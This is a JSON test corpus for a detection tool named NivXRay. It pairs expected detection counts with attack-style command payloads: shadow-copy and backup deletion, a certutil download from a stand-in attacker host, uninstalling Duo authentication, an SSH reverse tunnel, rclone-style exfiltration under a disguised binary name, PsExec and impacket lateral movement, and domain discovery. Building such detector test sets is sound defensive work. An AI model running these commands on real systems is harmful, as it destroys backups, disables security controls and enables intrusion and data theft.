{
  "name": "NivXRay seed corpus · P0.9",
  "description": "Representative payloads exercising every provenance kind. Covers benign, remote-access, ransomware impact, defense-evasion, exfil, discovery, LOLBAS, and PowerShell paths.",
  "cases": [
    {
      "id":       "benign_text",
      "family":   "benign",
      "expected": {"behaviors_min": 0, "recs_max": 0},
      "payload":  "Hello, this is a plain text file describing our lunch menu.\nThere is no code here.\n"
    },
    {
      "id":       "ransomware_shadow_wbadmin_bcdedit",
      "family":   "impact",
      "expected": {"behaviors_min": 3, "recs_min": 2},
      "payload":  "cmd /c vssadmin delete shadows /all /quiet\r\ncmd /c wbadmin delete catalog -quiet\r\ncmd /c bcdedit /set {default} bootstatuspolicy ignoreallfailures\r\n"
    },
    {
      "id":       "certutil_urlcache_download",
      "family":   "ingress",
      "expected": {"behaviors_min": 1},
      "payload":  "powershell -c \"certutil.exe -urlcache -split -f http://attacker.example.com/edge.zip C:\\Users\\Public\\edge.zip\""
    },
    {
      "id":       "wmic_uninstall_duo",
      "family":   "defense_evasion",
      "expected": {"behaviors_min": 1},
      "payload":  "cmd /c wmic product where name=\"Duo Authentication for Windows\" call uninstall\r\n"
    },
    {
      "id":       "openssh_reverse_tunnel",
      "family":   "c2",
      "expected": {"behaviors_min": 1},
      "payload":  "C:\\Windows\\System32\\OpenSSH\\ssh.exe -R :12840 -N attacker@1.2.3.4 -p 443\r\n"
    },
    {
      "id":       "rclone_exfil",
      "family":   "exfiltration",
      "expected": {"behaviors_min": 1},
      "payload":  "wininit.exe copy --max-age 1y --exclude *{psd,7z,mox,pst,iso,exe} C:\\Data remote:bucket/\r\n"
    },
    {
      "id":       "psexec_lateral",
      "family":   "lateral_movement",
      "expected": {"behaviors_min": 1},
      "payload":  "PsExec.exe \\\\WORKSTATION-01 -u DOMAIN\\admin -p SecretPass cmd /c whoami\r\n"
    },
    {
      "id":       "impacket_atexec",
      "family":   "lateral_movement",
      "expected": {"behaviors_min": 1},
      "payload":  "python3 atexec.py DOMAIN/admin:pass@target 'whoami'\r\n"
    },
    {
      "id":       "discovery_nltest_quser_ipconfig",
      "family":   "discovery",
      "expected": {"behaviors_min": 2},
      "payload":  "nltest /dclist:DOMAIN\r\nquser /server:WS-01\r\nipconfig /all\r\nwhoami /priv\r\n"
    },
    {
      "id":       "powershell_encodedcommand_downloadcradle",
      "family":   "execution",
      "expected": {"behaviors_min": 1},
      "encoding": "base64",
      "payload":  ""
    }
  ]
}
